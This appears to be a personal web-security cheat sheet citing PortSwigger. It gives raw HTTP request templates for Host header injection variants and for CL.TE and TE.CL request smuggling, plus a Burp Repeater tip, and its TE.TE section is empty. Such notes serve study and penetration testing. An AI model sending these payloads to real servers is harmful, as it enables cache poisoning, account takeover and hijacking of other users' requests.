- [Host_Header_Injection](#Host_Header_Injection)
  - [Host_Header_Injection malicious port](#HHI_malicious_port)
  - [Host_Header_Injection malicious subdomain](#HHI_malicious_subdomain)
  - [Host_Header_Injection duplicate host headers](#HHI_duplicate_host_headers)
  - [Host Header Injection absolute URL](#HHI_absolute_URL)
  - [Host Header Injection line wrapping](HHI_line_wrapping)
  - [Host Header Injectio_inject_headers](#HHI_inject_headers)
  
- [Request Smuggling](#Request_smuggling)
  -[Server behavior](#RS_server_behavior)
    - [CL.TE](#CL.TE)
    - [TE.CL](#TE.CL)
    - [TE.TE](#TE.TE)
    
# Host_Header_Injection

## HHI_malicious_port
```
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
```

## HHI_malicious_subdomain
```
GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com
```

## HHI_duplicate_host_headers
```
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here
```

## HHI_absolute URL
```
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here
```

## HHI_line wrapping
```
GET /example HTTP/1.1
 Host: bad-stuff-here
Host: vulnerable-website.com
```

## HHI_inject_headers
```
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here

example headers
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Request_smuggling

## RS_server_behavior

- CL.TE: The front-end server uses the Content-Length header, and the backend server uses Transfer-Encoding.
- TE.CL: the front-end server uses the Transfer-Encoding header, and the backend server uses the Content-Length header.
- TE.TE: The front-end and back-end servers support the Transfer-Encoding header, but one of the servers may be forced to not process it if it has been obfuscated.

### CL.TE
```
POST / HTTP/1.1
Host: my-vulnerablewebsite.com
Content-Length: 13
Transfer-Encoding: chunked
0
SMUGGLED
```
### TE.CL
```
POST / HTTP/1.1
Host: my-vulnerablewebsite.com
Content-Length: 3
Transfer-Encoding: chunked
8
SMUGGLED
0
```
In Burp repeater 'Update Content-Length' option is unchecked.You need to include the ending sequence \ r \ n \ r \ n after the last 0.

### TE.TE


------------------------------------------------------------------------------------------------------------------------------------------------------------------
References
- https://portswigger.net
